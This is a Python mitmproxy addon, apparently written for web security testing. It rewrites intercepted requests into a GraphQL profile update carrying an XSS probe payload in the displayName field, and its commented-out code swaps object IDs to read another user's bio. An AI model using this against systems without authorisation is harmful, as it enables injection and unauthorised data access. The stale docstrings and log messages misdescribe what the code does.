from mitmproxy import http
from mitmproxy import ctx
from mitmproxy import command
from mitmproxy.addonmanager import Loader
from typing import Optional, Sequence
import mitmproxy.types


class URLInterceptor:
    def __init__(self) -> None:
        self.target_url: Optional[str] = None
        self.intercept_active: bool = False

    def load(self, loader: Loader) -> None:
        """
        Loads options for the addon.
        """
        loader.add_option(
            name="intercept_url",
            typespec=str,
            default="",
            help="URL to intercept and save content from.",
        )

    def configure(self, updated: set[str]) -> None:
        """
        Configures the addon when options are updated.
        """
        if "intercept_url" in updated:
            self.target_url = ctx.options.intercept_url
            if self.target_url:
                ctx.log.info(f"Target URL for interception set to: {self.target_url}")
            else:
                ctx.log.info("No target URL specified for interception.")

    @command.command("interceptor.start")
    def start_interception(self, url: str) -> None:
        """
        Starts interception for the specified URL and activates the interceptor.
        Usage: interceptor.start <url_to_intercept>
        """
        self.target_url = url
        self.intercept_active = True
        ctx.log.info(f"Started interception for URL: {self.target_url}")
        ctx.log.alert(f"Interceptor ON for: {self.target_url}")

    @command.command("interceptor.stop")
    def stop_interception(self) -> None:
        """
        Stops the active interception.
        Usage: interceptor.stop
        """
        self.intercept_active = False
        ctx.log.info("Stopped interception.")
        ctx.log.alert("Interceptor OFF")

    def request(self, flow: http.HTTPFlow) -> None:
        """
        Intercepts HTTP requests matching the target URL, saves the request body, and kills the flow.
        """
        if (
            self.intercept_active
            and self.target_url
            and self.target_url in flow.request.url
        ):
            ctx.log.info(f"Intercepting request to: {flow.request.url}")
            # Parse and modify JSON content if present
            import json

            if flow.request.content:
                flow.request.content = json.dumps(
                    {
                        "query": "mutation UpdateProfileMutation( $displayName: String!) { updateProfile( displayName: $displayName) { error user { id displayName } } }",
                        "variables": {
                            "displayName": '<script>alert("XSS")</script>',
                        },
                    }
                ).encode("utf-8")
                # try:
                #     json_data = json.loads(flow.request.content.decode("utf-8"))
                #     ctx.log.info(f"Parsed JSON request: {json_data}")
                #     if "variables" in json_data and "id" in json_data["variables"]:
                #         # ctx.log.info(
                #             #     f"Original displayName: {json_data['variables']['displayName']}"
                #         # )
                #         json_data["variables"]["id"] = "QWRkcmVzc05vZGU6MjYwNTQwMDY="
                #         # ctx.log.info(
                #         #     f"Modified displayName: {json_data['variables']['displayName']}"
                #         # )
                #         flow.request.content = json.dumps("""{
                #           "query": "query { getUser(id: \"VXNlck5vZGU6MzQwMjkyMzA=\") { bio } }"
                #         }""").encode("utf-8")
                #         ctx.log.info(
                #             f"Modified displayName field in JSON request variables"
                #         )
                #     else:
                #         ctx.log.info("No displayName found in JSON variables")
                # except (json.JSONDecodeError, UnicodeDecodeError) as e:
                #     ctx.log.error(f"Failed to parse or modify JSON: {e}")
            # if flow.request.content:
            #     filename = f"intercepted_request_body_{flow.id}.bin"
            #     with open(filename, "wb") as f:
            #         f.write(flow.request.content)
            #     ctx.log.info(f"Saved request body to {filename}")

            # Kill the flow to stop it from proceeding to the server
            # flow.kill()
            ctx.log.info(f"Killed flow for URL: {flow.request.url}")

    def response(self, flow: http.HTTPFlow) -> None:
        """
        This method is no longer responsible for saving content,
        as we are handling request body saving and killing the flow in the request hook.
        """
        pass
